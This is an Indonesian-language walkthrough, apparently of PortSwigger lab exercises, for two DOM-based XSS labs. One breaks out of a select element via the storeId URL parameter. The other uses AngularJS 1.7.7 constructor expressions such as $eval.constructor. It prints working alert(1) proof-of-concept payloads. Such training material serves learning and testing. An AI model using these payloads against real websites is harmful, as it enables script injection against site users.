# Cross-site scripting (XSS)

## DOM XSS in document.write sink using source location.search inside a select element
- Celah keamanan berada di halaman detail produk
- Klik tombol **View details**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%201.JPG)

- Klik kanan halaman kemudian pilih **Lihat Kode Sumber Halaman**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%202.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%203.jpg)

- Akan ditemukan function javascript sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%204.JPG)

- Sekarang kita coba tambahkan parameter `storeId` pada URL kemudian tekan enter

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%205.JPG)

- Akan muncul list sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%206.jpg)

- Masukkan payload berikut pada URL kemudian tekan enter
```sh
&storeId="></select><img%20src=1%20onerror=alert(1)>
```

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%207.JPG)

- Selain payload diatas, anda juga bisa menggunakan payload dibawah ini
```sh
&storeId=</option></select><img%20src=1%20onerror=alert(1)>
```
- Payload diatas akan membentuk nilai sebagai berikut, sehingga menyebabkan kerentanan XSS
```sh
<select name="storeId"><option selected="">storeId="></option></select>
<img src="1" onerror="alert(1)">
```

## DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
- Celah keamanan XSS berada di fitur pencarian (Search)

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%208.JPG)

- Ketik 'test' pada field pencarian lalu tekan tombol **Search**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%209.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%2010.JPG)

- Klik kanan halaman kemudian pilih **Lihat Kode Sumber Halaman**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%2011.jpg)

- Terdapat informasi bahwa halaman menggunakan AngularJS versi 1.7.7 dan hasil pencarian terdapat dalam elemen body dengan atribut `ng-app` yang merupakan direktif AngularJs. Dengan direktif AngularJs kita bisa menjalankan javascript dalam kurung kurawal ganda

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%2012.JPG)

- Jika kita klik link src nya akan tampil library angular js versi 1.7.7

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%2013.JPG)

- Untuk memastikan bahwa kita berada di elemen ng-app Directive kita bisa memasukkan string sebagai berikut
```sh
{{2 + 3}}
```
![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%2014.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%2015.JPG)

- Sekarang kita masukkan payload XSS menggunakan object default pada angularJS
```sh
{{$eval.constructor('alert(1)')()}}
```

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%2016.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%2017.JPG)

- Selain payload diatas anda juga bisa menggunakan payload berikut ini
```sh
{{$on.constructor('alert(1)')()}}
{{$watch.constructor('alert(1)')()}}
```

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%2018.JPG)

- Fungsi `$on.constructor('alert(1)')()` mirip dengan javascript sebagai berikut
```sh
function (){
   alert(1);
}
```